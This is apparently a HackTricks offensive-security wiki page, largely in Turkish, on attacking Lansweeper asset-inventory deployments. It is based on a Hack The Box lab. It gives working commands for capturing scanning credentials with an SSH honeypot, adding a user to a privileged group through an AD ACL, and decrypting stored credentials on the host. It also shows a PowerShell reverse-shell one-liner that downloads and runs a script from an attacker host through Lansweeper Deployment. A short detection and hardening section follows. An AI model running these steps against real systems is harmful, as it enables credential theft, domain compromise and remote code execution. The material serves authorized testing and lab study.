# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper, genellikle Windows üzerinde konuşlandırılan ve Active Directory ile entegre edilen bir IT varlık keşif ve envanter platformudur. Lansweeper'a yapılandırılmış kimlik bilgileri, tarama motorları tarafından SSH, SMB/WMI ve WinRM gibi protokoller üzerinden varlıklara kimlik doğrulamak için kullanılır. Yanlış yapılandırmalar sıklıkla şunlara izin verir:

- Tarama hedefini saldırgan kontrollü bir sunucuya (honeypot) yönlendirerek kimlik bilgilerini yakalama
- Lansweeper ile ilişkili gruplar tarafından açığa çıkan AD ACL'lerinin kötüye kullanılarak uzaktan erişim elde edilmesi
- Lansweeper'da yapılandırılmış gizli bilgilerin (connection strings ve kayıtlı tarama kimlik bilgileri) host üzerinde şifresinin çözülmesi
- Deployment özelliği aracılığıyla yönetilen uç noktalarda kod yürütme (çoğunlukla SYSTEM olarak çalışır)

Bu sayfa, bu davranışların istismarı için pratik saldırgan iş akışları ve komutları özetler.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Yakalanan kimlik bilgilerini DC hizmetlerine karşı doğrulayın:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notlar
- Diğer protokoller için de benzer şekilde çalışır; scanner'ı listener'ınıza zorlayabildiğiniz durumlarda (SMB/WinRM honeypots, vb.). SSH genellikle en basit olandır.
- Birçok scanner kendini ayırt edici client banner'larıyla tanımlar (ör. RebexSSH) ve zararsız komutları deneyecektir (uname, whoami, vb.).

## 2) AD ACL abuse: bir app-admin group'a kendinizi ekleyerek uzak erişim elde etme

Kompromize hesap üzerinden etkin hakları enumerate etmek için BloodHound kullanın. Sık rastlanan bir bulgu, scanner- veya uygulamaya özgü bir grubun (ör. “Lansweeper Discovery”) ayrıcalıklı bir grup üzerinde GenericAll'e sahip olmasıdır (ör. “Lansweeper Admins”). Eğer ayrıcalıklı grup aynı zamanda “Remote Management Users” üyesiyse, kendimizi ekledikten sonra WinRM kullanılabilir hale gelir.

Toplama örnekleri:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll'ı grupta BloodyAD (Linux) ile:
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Sonra bir interactive shell alın:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
İpucu: Kerberos işlemleri zamana duyarlıdır. Eğer KRB_AP_ERR_SKEW ile karşılaşırsanız, önce DC ile saat senkronizasyonu yapın:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Ana makinede Lansweeper tarafından yapılandırılmış secrets'leri çözme

Lansweeper sunucusunda, ASP.NET sitesi genellikle uygulama tarafından kullanılan şifrelenmiş connection string ve uygulama tarafından kullanılan bir simetrik anahtar depolar. Uygun yerel erişimle DB connection string'ini çözebilir ve ardından depolanmış tarama kimlik bilgilerini çıkarabilirsiniz.

Tipik konumlar:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Uygulama anahtarı: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Depolanmış kimlik bilgilerini otomatik olarak çözmek ve dökmek için SharpLansweeperDecrypt'i kullanın:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Beklenen çıktı, DB bağlantı bilgilerini ve tüm ortamda kullanılan Windows ve Linux hesapları gibi düz metin tarama kimlik bilgilerini içerir. Bunlar genellikle etki alanı makinelerinde yükseltilmiş yerel haklara sahiptir:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Kurtarılan Windows scanning creds ile ayrıcalıklı erişim sağlayın:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins” üyesi olarak, web UI Deployment ve Configuration öğelerini gösterir. Deployment → Deployment packages altında, hedeflenen varlıklarda rastgele komutlar çalıştıran paketler oluşturabilirsiniz. Yürütme, Lansweeper service tarafından yüksek ayrıcalıklarla gerçekleştirilir ve seçilen hostta NT AUTHORITY\SYSTEM olarak kod yürütme sağlar.

High-level steps:
- Yeni bir Deployment package oluşturun ve PowerShell veya cmd tek satırlık komut (reverse shell, add-user, vb.) çalıştırsın.
- İstediğiniz varlığı hedefleyin (ör. Lansweeper'ın çalıştığı DC/host) ve Deploy/Run now'a tıklayın.
- Shell'inizi SYSTEM olarak yakalayın.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Dağıtım işlemleri gürültülüdür ve Lansweeper ile Windows olay günlüklerinde iz bırakır. İhtiyatlı kullanın.

## Tespit ve güçlendirme

- Anonim SMB enumerasyonlarını kısıtlayın veya kaldırın. Lansweeper paylaşımlarına yönelik RID cycling ve anormal erişimleri izleyin.
- Çıkış (egress) kontrolleri: tarayıcı sunuculardan dışa yönelik SSH/SMB/WinRM trafiğini engelleyin veya sıkı şekilde kısıtlayın. Standart olmayan portlar (ör. 2022) ve Rebex gibi olağandışı istemci banner'ları için alarm oluşturun.
- `Website\\web.config` ve `Key\\Encryption.txt` dosyalarını koruyun. Sırları bir vault'a dışarı alın ve ifşa durumunda döndürün. Mümkünse minimum ayrıcalıklı service account'lar ve gMSA kullanmayı değerlendirin.
- AD izleme: Lansweeper ile ilişkili gruplardaki değişiklikler (ör. “Lansweeper Admins”, “Remote Management Users”) ve ayrıcalıklı gruplara GenericAll/Write üyeliği veren ACL değişiklikleri için alarm oluşturun.
- Deployment paketlerinin oluşturulması/değiştirilmesi/çalıştırılmasını denetleyin; cmd.exe/powershell.exe çağıran paketler veya beklenmeyen dış bağlantılar için alarm oluşturun.

## İlgili konular
- SMB/LSA/SAMR enumeration ve RID cycling
- Kerberos password spraying ve clock skew ile ilgili hususlar
- BloodHound ile application-admin gruplarının path analizi
- WinRM kullanımı ve lateral movement

## Referanslar
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
